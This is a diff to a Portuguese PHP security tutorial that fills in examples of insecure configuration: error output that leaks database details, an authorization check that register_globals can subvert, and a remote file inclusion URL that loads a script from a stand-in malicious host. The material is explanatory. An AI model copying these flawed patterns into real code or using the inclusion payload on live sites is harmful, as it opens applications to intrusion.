@@ -43,13 +43,21 @@ executa a linha 04 que, por sua vez, interrompe a execução do script através 
 parâmetro do tipo string e exibe esse valor no navegador. No exemplo será enviado ao navegador o resultado da função
 `mysql_error()`.
 
-    código 6.1
+{% highlight php linenos %}
+<?php
+$link = mysql_connect('localhost', 'mysql_user', 'mysql_password');
+if (!$link) {
+    die( mysql_error() );
+}
+?>
+{% endhighlight %}
 
 Importante notar que a não utilização da função `die()` não sanaria o problema por completo. Se o módulo de PHP estiver
 configurado para exibir erros, uma mensagem como a mostrada no código abaixo a seguir seria exibida, entregando, dessa
 forma, informações valiosas para o atacante como o servidor e o usuário.
 
-    código 6.2
+    Warning mysql_connetc()[function.mysql-connect]: Access denied for user 'usuario'@'192.168.2.101'
+    (using password: YES) in /www/html/appweb/admin.php on line 7
 
 
 Prevenção
@@ -68,7 +76,17 @@ da função `usuario_autenticado()` é testado. Se verdadeiro é atribuído `tru
 testado o valor da variável `$autorizado`, se verdadeiro o script segue sua execução normalmente, acreditando-se que o 
 usuário foi realmente autenticado.
 
-    código 6.3
+{% highlight php linenos %}
+<?php
+if (  usuario_autenticado()  ) {
+    $autorizado = true;
+}
+
+if ($autorizado) {
+    include "/dados/autamentes/sensiveis.php";
+}
+?>
+{% endhighlight %}
 
 Estando o valor da diretiva __register_globals__ igual a `on` (habilitada) a variável `$autorizado` seria facilmente 
 manipulada. Alterando o valor para `off` o código funcionário corretamente (isento da vulnerabilidade). Outra forma de
@@ -92,8 +110,7 @@ A diretiva __allow_url_fopen__ ativa o dispositivo URL-aware fopen wrappers que 
 arquivos. Se esta diretiva estivar habilitada o atacante poderá executar arquivos externos como a demonstra o código 
 abaixo.
 
-    código 6.4
-
+    http://www.appvulneravel.com/index.php?pg=http://sitemalicioso.com/atacar.php
 
 Com a diretiva __error_reporting__ é possível determinar quais os erros, mensagens e avisos o PHP registrará. A 
 recomendação é `E_ALL`, dessa forma, todos os erros e mensagens de alerta (exceto os de nível `E_SRICT`) serão reportados.
